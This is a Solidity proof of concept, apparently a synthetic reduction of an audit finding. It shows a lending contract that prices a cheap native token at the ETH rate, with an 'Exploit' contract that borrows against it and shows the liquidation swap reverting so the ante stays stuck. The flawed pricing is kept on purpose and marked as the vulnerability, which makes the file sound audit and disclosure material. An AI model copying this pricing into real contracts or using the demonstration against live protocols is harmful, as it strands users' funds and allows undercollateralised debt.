// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  StackingSalmon — native token priced as ETH bricks the warn swap (Shieldify, 52787)
    SYNTHETIC, cheatcode-free reduction.
    Root cause: DEFAULT_ANTE is 0.01 ether, sized for ETH (~$2371) not the chain native
    token (~$6.29). Debt is booked at the ETH price. The warn/liquidation swap then
    demands that ETH-priced minimum and reverts, so the ante stays stuck and the
    debt cannot be cleared. */

contract MockERC20 {
    string public name = "Stable";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract NativeSwap {
    uint256 public constant NATIVE_PRICE = 629e16; // $6.29, 18 decimals
    MockERC20 public stable;

    constructor(MockERC20 s) {
        stable = s;
    }

    function swap(uint256 minStable) external payable returns (uint256 out) {
        out = msg.value * NATIVE_PRICE / 1e18;
        require(out >= minStable, "slippage");
        stable.transfer(msg.sender, out);
    }

    receive() external payable {}
}

contract Borrower {
    /// @dev The default amount of Ether required to take on debt in a `Borrower`.
    uint208 public constant DEFAULT_ANTE = 0.01 ether;
    /// @dev The maximum amount of Ether that `Borrower`s can be required to post before taking on debt.
    uint216 public constant CONSTRAINT_ANTE_MAX = 0.5 ether;
    uint256 public constant ETH_PRICE = 2371e18;
    uint256 public constant NATIVE_PRICE = 629e16;

    MockERC20 public stable;
    NativeSwap public swapper;
    mapping(address => uint256) public anteOf;
    mapping(address => uint256) public debtOf;

    constructor(MockERC20 s, NativeSwap w) {
        stable = s;
        swapper = w;
    }

    function borrow() external payable {
        require(msg.value == DEFAULT_ANTE, "ante");
        require(DEFAULT_ANTE <= CONSTRAINT_ANTE_MAX, "cap");
        // @> VULN: books the chain native token at the ETH price, so the warn swap cannot clear it
        uint256 debt = msg.value * ETH_PRICE / 1e18;
        anteOf[msg.sender] = msg.value;
        debtOf[msg.sender] = debt;
        stable.transfer(msg.sender, debt);
    }

    function warn(address borrower) external {
        uint256 payout = anteOf[borrower] / 4;
        uint256 minStable = payout * ETH_PRICE / 1e18;
        swapper.swap{value: payout}(minStable);
    }

    receive() external payable {}
}

contract ControlDesk {
    function buy(NativeSwap swapper, uint256 minOut) external payable returns (uint256) {
        return swapper.swap{value: msg.value}(minOut);
    }
}

contract Exploit {
    uint256 public constant ANTE = 0.01 ether;
    uint256 public constant N = 2371e16; // 0.01 * $2371
    uint256 public constant REAL = 629e14; // 0.01 * $6.29

    MockERC20 public stable; // nonce 1
    NativeSwap public swapper; // nonce 2
    Borrower public borrower; // nonce 3
    ControlDesk public desk; // nonce 4

    uint256 public debtTaken;
    uint256 public anteStuck;
    bool public warnReverted;
    uint256 public controlOut;

    constructor() {
        stable = new MockERC20();
        swapper = new NativeSwap(stable);
        borrower = new Borrower(stable, swapper);
        desk = new ControlDesk();
        stable.mint(address(borrower), N);
        stable.mint(address(swapper), REAL);
    }

    function run() external payable {
        require(msg.value == ANTE + ANTE, "value");
        borrower.borrow{value: ANTE}();
        debtTaken = stable.balanceOf(address(this));
        require(debtTaken == N, "debt");
        try borrower.warn(address(this)) {
            revert("warn swapped");
        } catch {
            warnReverted = true;
        }
        anteStuck = address(borrower).balance;
        require(warnReverted, "not bricked");
        require(anteStuck == ANTE, "ante not stuck");
        require(borrower.debtOf(address(this)) == N, "debt open");

        controlOut = desk.buy{value: ANTE}(swapper, ANTE * 629e16 / 1e18);
        require(controlOut == REAL, "control");
        require(stable.balanceOf(address(desk)) == REAL, "control paid the desk");
        require(stable.balanceOf(address(this)) == N, "borrow still outstanding");
    }
}
